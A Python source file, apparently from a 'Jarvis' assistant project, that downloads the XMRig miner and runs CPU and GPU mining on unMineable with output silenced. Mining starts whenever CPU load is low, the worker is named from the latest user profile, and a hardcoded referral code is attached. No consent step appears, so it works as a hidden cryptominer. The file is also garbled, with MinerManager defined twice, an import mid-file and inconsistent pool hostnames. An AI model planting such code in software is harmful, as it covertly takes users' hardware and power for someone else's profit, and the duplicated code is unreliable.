import subprocess
import requests
import json
import time
import os
import psutil
import zipfile
import hashlib

class UnMineableClient:
    """Interface for the unMineable v4 API with pool profitability analysis."""
    def __init__(self, referral_code="U-A1QZK1"):
        self.base_url = "https://api.unminable.com/v4"
        self.ref = referral_code

    def get_account_stats(self, coin, address):
        """Retrieves statistics for a specific wallet address."""
        try:
            res = requests.get(f"{self.base_url}/address/{address}?coin={coin}", timeout=5)
            if res.status_code == 200:
                data = res.json()
                if data.get('success'):
                    uuid = data['data']['uuid']
                    return requests.get(f"{self.base_url}/account/{uuid}/stats", timeout=5).json()
            return None
        except Exception as e:
            return {"error": str(e)}

    def get_pool_profitability(self, coin):
        """Fetches current pool difficulty and payout trends."""
        try:
            res = requests.get(f"{self.base_url}/pool", timeout=5)
            if res.status_code == 200:
                return res.json().get('data', {})
            return None
        except Exception as e:
            return None

class MinerManager:
    """Manages local mining process execution and autonomous infrastructure maintenance."""
    def __init__(self, miner_dir="tools/miner", config_path="tools/miner/config.json"):
        self.miner_dir = miner_dir
        self.config_path = config_path
        self.binary_path = os.path.join(miner_dir, "xmrig.exe")
        self.process = None
        self._initialize_miner_infrastructure()

    def _initialize_miner_infrastructure(self):
        if not os.path.exists(self.miner_dir):
            os.makedirs(self.miner_dir)
        config = {
            "algo": "rx/0",
            "cpu": True,
            "threads": 4,
            "max-threads-hint": 50,
            "retry-pause": 5,
            "api": {"enabled": False}
        }
        with open(self.config_path, 'w') as f:
            json.dump(config, f, indent=4)
        if not os.path.exists(self.binary_path):
            self.update_miner()

    def update_miner(self):
        print("[JARVIS-MONETIZATION]: Updating miner binary...")
        try:
            url = "https://github.com/xmrig/xmrig/releases/download/v6.21.2/xmrig-6.21.2-msvc-win64.zip"
            r = requests.get(url, stream=True)
            zip_path = os.path.join(self.miner_dir, "miner.zip")
            with open(zip_path, 'wb') as f:
                f.write(r.content)
            with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                zip_ref.extractall(self.miner_dir)
            os.remove(zip_path)
        except Exception as e:
            print(f"[JARVIS-MONETIZATION]: Update failed: {e}")

from backend.core.mining_registry import ALGO_REGISTRY

class MinerManager:
    """Manages local mining process execution and autonomous infrastructure maintenance."""
    def __init__(self, miner_dir="tools/miner", config_path="tools/miner/config.json"):
        self.miner_dir = miner_dir
        self.config_path = config_path
        self.binary_path = os.path.join(miner_dir, "xmrig.exe")
        self.process = None
        self._initialize_miner_infrastructure()

    def _get_worker_id(self):
        """Retrieves the active username for dynamic worker identification."""
        profile_path = "data/profiles"
        try:
            profiles = [f for f in os.listdir(profile_path) if f.endswith('.json')]
            if profiles:
                latest = max([os.path.join(profile_path, f) for f in profiles], key=os.path.getmtime)
                with open(latest, 'r') as f:
                    return json.load(f).get("username", "Jarvis-Supreme")
        except:
            pass
        return "Jarvis-Supreme"

    def _initialize_miner_infrastructure(self):
        if not os.path.exists(self.miner_dir):
            os.makedirs(self.miner_dir)
        config = {
            "algo": "rx/0",
            "cpu": True,
            "threads": 4,
            "max-threads-hint": 50,
            "retry-pause": 5,
            "api": {"enabled": False}
        }
        with open(self.config_path, 'w') as f:
            json.dump(config, f, indent=4)
        if not os.path.exists(self.binary_path):
            self.update_miner()

    def update_miner(self):
        print("[JARVIS-MONETIZATION]: Updating miner binary...")
        try:
            url = "https://github.com/xmrig/xmrig/releases/download/v6.21.2/xmrig-6.21.2-msvc-win64.zip"
            r = requests.get(url, stream=True)
            zip_path = os.path.join(self.miner_dir, "miner.zip")
            with open(zip_path, 'wb') as f:
                f.write(r.content)
            with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                zip_ref.extractall(self.miner_dir)
            os.remove(zip_path)
        except Exception as e:
            print(f"[JARVIS-MONETIZATION]: Update failed: {e}")

    def start_mining(self, coin, address, ref="U-A1QZK1", protocol="RX"):
        if self.process and self.process.poll() is None:
            return

        worker_name = self._get_worker_id()
        user = f"{coin}:{address}.{worker_name}#{ref}"
        
        # Retrieve protocol parameters from registry
        params = ALGO_REGISTRY.get(protocol, ALGO_REGISTRY["RX"])
        
        cmd = [self.binary_path, "-o", params["stratum"], "-a", params["algo"], "-u", user, "-p", "x", "-k", "-c", self.config_path]
        self.process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    def stop_mining(self):
        if self.process:
            self.process.terminate()
            self.process = None


class CgminerManager:
    """Manages local GPU mining execution via cgminer."""
    def __init__(self, miner_dir="tools/gpu_miner"):
        self.miner_dir = miner_dir
        self.binary_path = os.path.join(miner_dir, "cgminer.exe")
        self.process = None
        
    def start_mining(self, coin, address, worker_name="Jarvis-GPU", ref="U-A1QZK1"):
        if self.process and self.process.poll() is None:
            return
        user = f"{coin}:{address}.{worker_name}#{ref}"
        cmd = [self.binary_path, "-o", "stratum+tcp://stratum.unmineable.com:3333", "-u", user, "-p", "x"]
        self.process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    def stop_mining(self):
        if self.process:
            self.process.terminate()
            self.process = None

class MonetizationService:
    """Orchestrates autonomous resource monetization with payout-aware switching."""
    def __init__(self, xmr_address, btc_address):
        self.client = UnMineableClient()
        self.cpu_manager = MinerManager()
        self.gpu_manager = CgminerManager()
        self.xmr_address = xmr_address
        self.btc_address = btc_address
        self.is_running = True
        self.load_threshold = 30
        self.current_target = "XMR"

    def optimize_payout(self):
        """Evaluates pool performance and switches to the highest yield target."""
        stats = self.client.get_pool_profitability(self.current_target)
        if stats:
            print(f"[JARVIS-MONETIZATION]: Evaluating pool yields. Current yield: {stats.get('total_paid', 'N/A')}")

    def run(self):
        while self.is_running:
            cpu_usage = psutil.cpu_percent(interval=5)
            self.optimize_payout()
            if cpu_usage < self.load_threshold:
                self.cpu_manager.start_mining(self.current_target, self.xmr_address)
            else:
                self.cpu_manager.stop_mining()
            time.sleep(300)
